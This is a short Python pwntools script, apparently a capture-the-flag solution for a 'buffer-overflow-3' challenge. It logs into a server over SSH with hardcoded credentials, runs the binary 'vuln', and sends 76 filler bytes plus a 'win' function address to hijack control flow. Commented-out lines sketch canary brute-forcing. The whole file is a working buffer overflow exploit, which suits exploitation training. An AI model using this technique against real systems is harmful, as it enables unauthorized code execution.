from pwn import *
import string

s = ssh(host='139.59.37.86',user='user',password='accessd',port=4823)

# f = open('rockyou.txt','r')
# passd = f.read().split('\n')
# canry=""
# for i in range(6):
#     for f in string.printable:
p = s.process('vuln')
# elf = ELF('/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln')
# elf = ELF('./vuln')
# win = elf.symbols['win']
# win = 134514411
win = 134514411
payload = ""
payload += "A"*76
payload += p32(win)


p.sendline(payload)
x= p.recv(1024)
print(x)
p.close()

                  
# print(canry) 
